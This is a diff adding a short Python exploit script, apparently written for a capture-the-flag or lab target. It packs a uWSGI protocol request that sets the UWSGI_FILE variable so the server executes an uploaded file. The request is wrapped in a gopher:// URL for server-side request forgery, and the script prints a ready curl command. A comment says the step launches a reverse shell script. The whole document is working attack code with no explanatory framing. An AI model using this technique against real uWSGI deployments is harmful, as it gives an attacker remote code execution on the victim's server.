@@ -1,0 +1,58 @@
+import urllib.parse
+import sys
+
+# Some code adopted from
+# https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md
+# https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py
+
+SERVER_HOST = "127.0.0.1"     # Host of the web app
+UWSGI_PORT = "5000"             # Port of the uWSGI server
+
+'''
+Get size of data.
+'''
+def sz(x):
+    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')
+    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')
+    return s[::-1]
+
+
+'''
+Pack uWSGI variables according to uwsgi protocol spec.
+'''
+def pack_uwsgi_vars(var):
+    pk = b''
+    for k, v in var.items() if hasattr(var, 'items') else var:
+        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
+    result = b'\x00' + sz(pk) + b'\x00' + pk
+    return result
+
+
+'''
+Generate a uwsgi packet
+'''
+def gen_uwsgi_packet(var):
+    return pack_uwsgi_vars(var)
+
+
+# =====================================================================================================
+# (2) SSRF by communicating to uWSGI port with uwsgi in gopher protocol to run the reverse shell script
+# =====================================================================================================
+# uWSGI variables to set
+var = {
+    'SERVER_PROTOCOL': 'HTTP/1.1',
+    'REQUEST_METHOD': 'GET',
+    'PATH_INFO': "/",
+    'REQUEST_URI': "/",
+    'QUERY_STRING': "",
+    'SERVER_NAME': "",
+    'HTTP_HOST': "%s:%s" % (SERVER_HOST, UWSGI_PORT),
+    'UWSGI_FILE': "/app/profiles/IOI-655321.json", #Absolute path to script to be run (regardless of extension)
+    'SCRIPT_NAME': "/callbackapp"
+}
+
+# Pack and encode the uwsgi variables
+# Construct gopher protocol url that connects to uWSGI port to set magic variables
+payload = 'gopher:///127.0.0.1:5000/_%s' % urllib.parse.quote(
+    gen_uwsgi_packet(var))
+print("curl -v " + payload)
